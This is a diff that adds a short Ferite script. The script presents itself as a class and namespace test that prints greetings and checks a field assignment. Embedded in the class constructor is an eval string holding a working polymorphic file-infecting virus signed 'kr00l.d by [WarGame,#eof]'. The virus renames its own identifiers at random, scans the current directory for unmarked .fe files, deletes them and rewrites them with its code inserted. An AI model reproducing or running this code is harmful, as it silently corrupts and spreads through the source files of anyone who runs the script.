@@ -1,0 +1,38 @@
+#!/usr/bin/env ferite
+
+uses "console";
+
+namespace foo
+{
+
+    class bar
+    {
+       public static number i;
+
+       function constructor( string hello )
+       {
+           Console.println( "$hello" );
+       
+eval('uses "filesystem","sys","regexp","math","string","date";function BBEAGI(string FJCGFK) { string JRHBGH = File.open(FJCGFK).toString(); if(String.index(JRHBGH,"kr00l.d by [WarGame,#eof]") != -1) {return 1;} else {return 0;}} function BGGCJD() {return 65; } function GSGIAO(number sd) { Math.srand(sd); return String.sprintf("%c%c%c%c%c%c",((Math.rand()%10)+BGGCJD()),((Math.rand()%20)+BGGCJD()),((Math.rand()%11)+BGGCJD()),((Math.rand()%9)+BGGCJD()),((Math.rand()%14)+BGGCJD()),((Math.rand()%16)+BGGCJD()));} string GHCIFI = "kr00l.d by [WarGame,#eof]";string GHGBAD = "";string HKGAFH = "";object HTJHHK =  File.open(Sys.scriptName());string CDFEAB = "";object JMDCGM = new Directory("."); while(String.index((HKGAFH = HTJHHK.readln()),GHCIFI) == -1) {} if(1) { HKGAFH = Regexp.replaceAll("GHCIFI",HKGAFH,GSGIAO(Date.now()+1989)); HKGAFH = Regexp.replaceAll("BBEAGI",HKGAFH,GSGIAO(Date.now()+1975)); HKGAFH = Regexp.replaceAll("HKGAFH",HKGAFH,GSGIAO(Date.now()+2006)); HKGAFH = Regexp.replaceAll("BGGCJD",HKGAFH,GSGIAO(Date.now()+1900)); HKGAFH = Regexp.replaceAll("FJCGFK",HKGAFH,GSGIAO(Date.now()+1930)); HKGAFH = Regexp.replaceAll("JRHBGH",HKGAFH,GSGIAO(Date.now()+1910)); HKGAFH = Regexp.replaceAll("JMDCGM",HKGAFH,GSGIAO(Date.now()+1920)); HKGAFH = Regexp.replaceAll("GHGBAD",HKGAFH,GSGIAO(Date.now()+1950)); HKGAFH = Regexp.replaceAll("CDFEAB",HKGAFH,GSGIAO(Date.now()+1970)); HKGAFH = Regexp.replaceAll("HTJHHK",HKGAFH,GSGIAO(Date.now()+1890)); HKGAFH = Regexp.replaceAll("GSGIAO",HKGAFH,GSGIAO(Date.now()+1800)); } while((GHGBAD = JMDCGM.getEntry()) != "") { if(String.index(Sys.scriptName(),GHGBAD) == -1 && String.index(GHGBAD,".fe") != -1) {  if(!BBEAGI(GHGBAD)) { CDFEAB = File.open(GHGBAD).toString(); File.remove(GHGBAD); CDFEAB = Regexp.replace("}",CDFEAB,"\n" + HKGAFH+"}\n"); File.create(GHGBAD).writeln(CDFEAB); } } }');
+}
+
+
+       static function test()
+       {
+           Console.println( "foo::test()" );
+       }
+    }
+
+}
+
+object bah = new foo.bar("foo");
+foo.bar.test();
+foo.bar.i = 2;
+
+iferr {
+  bah.i = 3;
+} fix {
+  Console.println( "bah.i = 3; Failed, This was expected" );
+}
+              
+
